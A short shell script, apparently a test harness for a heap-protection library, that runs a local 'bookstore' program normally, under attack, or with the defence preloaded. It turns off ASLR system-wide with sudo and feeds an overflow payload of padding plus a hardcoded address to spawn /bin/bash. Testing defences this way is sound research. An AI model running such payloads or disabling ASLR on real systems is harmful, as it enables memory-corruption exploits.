#Disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
if [ "$1" == "protect" ]; then
	MALICIOUS_INPUT=`perl -e 'printf "A" x 24 . "\x90\x61\xe5\xb7"'`
	export LD_PRELOAD=../../lib/libheapsentryu.so
	./bookstore /bin/bash $MALICIOUS_INPUT
	#./bookstore /bin/bash /bin/bash
elif [ "$1" == "attack" ]; then
	./bookstore /bin/bash `perl -e 'printf "A" x 24 . "\x90\x61\xe5\xb7"'`
else
	./bookstore HarryPorter.txt KiteRunner.txt
fi

#Renable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
